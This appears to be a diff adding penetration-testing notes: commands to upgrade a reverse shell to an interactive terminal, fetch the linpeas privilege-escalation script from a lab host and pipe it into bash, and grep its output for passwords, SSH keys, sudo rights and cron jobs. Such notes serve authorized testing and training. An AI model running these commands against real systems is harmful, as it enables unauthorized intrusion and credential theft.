@@ -1,0 +1,28 @@
+python -c 'import pty; pty.spawn("/bin/bash")'
+CTRL Z
+stty raw -echo;fg;reset
+export TERM=xterm-256color
+stty cols 132 rows 34
+
+
+curl http://10.10.14.132/linpeas.sh | bash
+./linpeas.sh | tee linpeas_output.txt
+bash# Run linpeas and pipe to less
+./linpeas.sh | tee linpeas_output.txt | less -R
+
+# Or view saved output
+less -R linpeas_output.txt
+
+
+# View only 95% and above findings (most critical)
+./linpeas.sh | grep -A 20 "95%"
+
+# View only 99% findings (critical)
+./linpeas.sh | grep -A 50 "99%"
+
+# Search for specific keywords
+./linpeas.sh | grep -i "password"
+./linpeas.sh | grep -i "ssh"
+./linpeas.sh | grep -i "sudo"
+./linpeas.sh | grep -i "writable"
+./linpeas.sh | grep -i "cron"
